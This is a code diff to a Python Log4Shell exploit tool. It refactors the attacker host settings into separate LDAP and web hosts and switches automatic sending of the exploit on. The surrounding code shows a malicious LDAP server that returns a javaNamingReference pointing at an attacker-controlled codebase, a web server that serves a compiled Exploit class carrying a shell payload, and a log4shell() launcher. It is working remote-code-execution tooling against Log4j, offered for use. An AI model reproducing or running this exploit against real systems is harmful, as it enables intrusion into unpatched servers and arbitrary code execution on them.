@@ -20,11 +20,13 @@ from typing import Dict, Tuple, Union, Literal
 ### Settings ###
 
 # TODO: Set to your local configuration.
-LHOST: str = "127.0.0.1"
+LDAP_HOST: str = "127.0.0.1"
 LDAP_PORT: int = 1387
+LDAP_URL: str = f"ldap://{LDAP_HOST}:{LDAP_PORT}"
+
+WEB_HOST: str = "127.0.0.1"
 WEB_PORT: int = 1337
-LDAP_URL: str = f"ldap://{LHOST}:{LDAP_PORT}"
-CODEBASE_URL: str = f"http://{LHOST}:{WEB_PORT}/"
+WEB_URL: str = f"http://{WEB_HOST}:{WEB_PORT}/"
 
 # TODO: Set to Target class/OS. 
 # - Linux will encapsulate your payload in `/bin/sh -c ...`.
@@ -37,7 +39,7 @@ CLASS_NAME: str = "Exploit"
 PAYLOAD: str = """chromium"""
 
 # TODO: Set to True if you want to automatically run the `send_juni` method.
-RAUTO: bool = False
+RAUTO: bool = True
 
 ### Automation ###
 
@@ -153,7 +155,7 @@ class LDAPHandler(socketserver.BaseRequestHandler):
 
         response = LDAPResponse(query_name, {
             "javaClassName": "foo", 
-            "javaCodeBase": CODEBASE_URL, 
+            "javaCodeBase": WEB_URL, 
             "objectClass": "javaNamingReference", 
             "javaFactory": CLASS_NAME
         })
@@ -164,7 +166,7 @@ class LDAPHandler(socketserver.BaseRequestHandler):
         acknowledge = self.request.recv(8096)
 
 def ldap():
-    with socketserver.TCPServer((LHOST, LDAP_PORT), LDAPHandler) as server:
+    with socketserver.TCPServer((LDAP_HOST, LDAP_PORT), LDAPHandler) as server:
         server.serve_forever()
 
 def build_class(cls, payload):
@@ -194,7 +196,7 @@ class WebHandler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(output)
 
 def web():
-    with http.server.HTTPServer((LHOST, WEB_PORT), WebHandler) as server:
+    with http.server.HTTPServer((WEB_HOST, WEB_PORT), WebHandler) as server:
         server.serve_forever()
 
 def log4shell():
